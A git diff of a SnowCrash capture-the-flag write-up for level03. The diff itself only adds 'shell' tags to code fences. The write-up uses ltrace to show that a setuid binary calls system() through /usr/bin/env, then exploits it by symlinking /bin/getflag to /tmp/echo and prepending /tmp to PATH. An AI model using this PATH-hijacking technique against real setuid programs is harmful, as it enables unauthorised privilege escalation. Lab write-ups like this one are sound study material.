@@ -1,5 +1,5 @@
 we found the following file in the home directory
-```
+```shell
 level02@SnowCrash:~$ ls -l
 total 12
 -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
@@ -10,7 +10,7 @@ we notice two key thing:
  - using the command `file level03` we know that the file is a dynamically linked executable, meaning that it loads shared libs during the run time if the program
 
 lets use `ltrace` to get a idea of what the program dose
-```
+```shell
 level03@SnowCrash:~$ ltrace ./level03
 __libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
 getegid() = 2003
@@ -26,7 +26,7 @@ system("/usr/bin/env echo Exploit me"Exploit me
 
 we find that the binary calls the `system` function with the argument of `"/usr/bin/env echo Exploit me"`
 we can exploit that input by running our own version of echo
-```
+```shell
 level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
 level03@SnowCrash:~$ export PATH=/tmp:$PATH
 level03@SnowCrash:~$ ./level03
